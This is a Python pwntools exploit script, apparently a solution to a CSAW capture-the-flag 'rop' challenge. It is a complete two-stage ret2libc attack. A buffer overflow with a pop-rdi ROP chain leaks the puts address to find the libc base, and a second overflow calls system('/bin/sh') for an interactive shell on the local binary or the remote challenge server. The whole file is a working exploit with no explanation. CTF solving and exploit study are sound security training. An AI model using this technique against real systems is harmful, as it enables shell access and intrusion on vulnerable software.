#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./rop')
context.log_level = 'INFO'

if args.REMOTE:
	context.log_file = 'remote.log'
	#libc = ELF('libc-2.27.so') # bullshit
	libc = ELF('libc-database/db/libc6_2.27-3ubuntu1.2_amd64.so')
	#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
	p = remote('pwn.chal.csaw.io', 5016)
else:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('Hello\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x28 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('Hello\n',payload)
p.interactive()
